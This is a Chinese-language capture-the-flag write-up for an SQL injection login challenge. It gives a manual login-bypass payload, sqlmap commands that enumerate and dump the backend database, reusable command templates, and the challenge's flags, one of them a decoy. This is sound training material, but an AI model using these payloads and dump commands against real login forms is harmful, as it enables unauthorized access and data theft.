# WP｜qsnctf SQL 注入登录绕过 + sqlmap 工作流

- **题目**：`http://challenge.qsnctf.com:40517/` 登录框
- **类型**：SQL 注入 → 登录绕过（error-based / time-based blind，后端 MySQL/MariaDB）
- **最终真实 flag**：`flag{eb343e3467ad4ccf8abfe1c065c6a90a}`
- **数据库里的假 flag（诱饵）**：`flag{This_is_Fake_flag}`

---

## 0. 侦察结论

| 项 | 值 |
|---|---|
| 页面 | 登录框（Nginx 1.18 + PHP 7.2.34） |
| 提交方式 | POST，字段 `username`、`password`，`action=""` 提交到自身 |
| 注入点 | `username` 参数 |
| 注入类型 | **报错型（error-based, FLOOR）** + **时间盲注（time-based blind）** |
| 后端 | MySQL >= 5.0（MariaDB fork） |
| 验证 | `username=admin'` → 页面回显 `You have an error in your SQL syntax`，确认引号打破原 SQL |

后端拼的 SQL 大致是：
```sql
SELECT ... FROM ... WHERE username='$u' AND password='$p'
```

---

## 1. 最快解法：手动登录绕过（1 秒出真 flag）

让 WHERE 条件恒真、并注释掉后面的校验即可：

```
POST /  username=admin' OR 1=1-- -   password=随便
```

- `'` 闭合原字符串 → `OR 1=1` 恒成立 → `-- -` 把 `AND password='...'` 注释掉
- 返回 **302 跳转 `admin.php`** → 落地页直接打印 **`flag{eb343e3467ad4ccf8abfe1c065c6a90a}`**

> 这是本题真正的 flag 来源。

---

## 2. sqlmap 完整工作流（本题重点：练工具）

> sqlmap 入口：`C:\Users\Administrator\Desktop\ctf_tools\sqlmap-master\sqlmap.py`
> **必加 `--batch`**：否则本机这个 dev 版会卡在 "Press Enter to continue..."。

### 第 0 步：检测注入点
```bash
python C:\Users\Administrator\Desktop\ctf_tools\sqlmap-master\sqlmap.py ^
  -u "http://challenge.qsnctf.com:40517/" ^
  --data="username=admin&password=admin" ^
  -p username --batch --flush-session --dbs
```
- `--data`：POST 请求体，告诉 sqlmap 注入在 POST 表单里。
- `-p username`：只测 `username` 参数。
- 结果：`username` 为 error-based(FLOOR) + time-based blind 双可利用，后端 MySQL/MariaDB。

### 第 1 步：列数据库 `--dbs`
```
[*] gitctf
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
```
业务库 = **`gitctf`**。

### 第 2 步：列业务库的表 `-D gitctf --tables`
```
Database: gitctf
[2 tables]
| user |
| flag |
```

### 第 3 步：列 flag 表的列 `-D gitctf -T flag --columns`
```
Table: flag
| Column | Type    |
| id     | int(11) |
| flag   | text    |
```

### 第 4 步：导出数据 `-T flag --dump`
```
Database: gitctf
Table: flag
[1 entry]
+----+-------------------------+
| id | flag                    |
+----+-------------------------+
| 1  | flag{This_is_Fake_flag} |
+----+-------------------------+
```
导出结果也存成了 CSV：`C:\tmp\sqlmap_out\challenge.qsnctf.com\dump\gitctf\flag.csv`

---

## 3. ⚠️ 本题最关键的坑：数据库里的 flag 是假的！

sqlmap 一路顺滑把 `flag` 表拖了出来，但里面是 **`flag{This_is_Fake_flag}`**——出题人放的**诱饵 / 蜜罐**。

**真实 flag** 不在数据库里，而是在**登录成功后的 `admin.php` 页面**打印出来的那个（`flag{eb343e3467ad4ccf8abfe1c065c6a90a}`）。

### 教训（务必记住）
1. **拖库 ≠ 拿到真 flag**。很多 CTF 会在数据库里塞假 flag 误导你。
2. **登录绕过 / 代码执行 / 文件读取** 这些"业务逻辑层面"的出口，常常才是真 flag 所在。
3. 拿到疑似 flag 先**提交验证**或**比对多来源**；一眼假（如含 `Fake`/`This_is`）的，果断回到其他路径找真值。
4. sqlmap 是**顶级侦察与枚举工具**（库/表/列/数据一把梭），但"哪个是真正的 flag 字段/出口"需要人来判断。

---

## 4. 本题学到的 6 件事
1. 登录框 POST 注入：用 `--data` + `-p 参数名` 让 sqlmap 打 POST 点。
2. `--batch` 在非交互环境必加，避免卡输入。
3. sqlmap 四步链：`--dbs` → `-D 库 --tables` → `-T 表 --columns` → `--dump`。
4. error-based 能直接回显报错；time-based blind 靠 `SLEEP` 延迟判断，本题两者都中。
5. **假 flag 陷阱**：DB 里 `flag` 字段可能是诱饵，真 flag 在登录后页面。
6. 工具做侦察/枚举，最终判断真假要靠人。

---

## 5. 速查：本题三条命令模板
```bash
# 检测 + 列库
sqlmap.py -u "URL" --data="username=a&password=b" -p username --batch --dbs

# 列表 / 列 / 导出
sqlmap.py -u "URL" --data="username=a&password=b" -p username --batch -D gitctf --tables
sqlmap.py -u "URL" --data="username=a&password=b" -p username --batch -D gitctf -T flag --columns
sqlmap.py -u "URL" --data="username=a&password=b" -p username --batch -D gitctf -T flag --dump
```
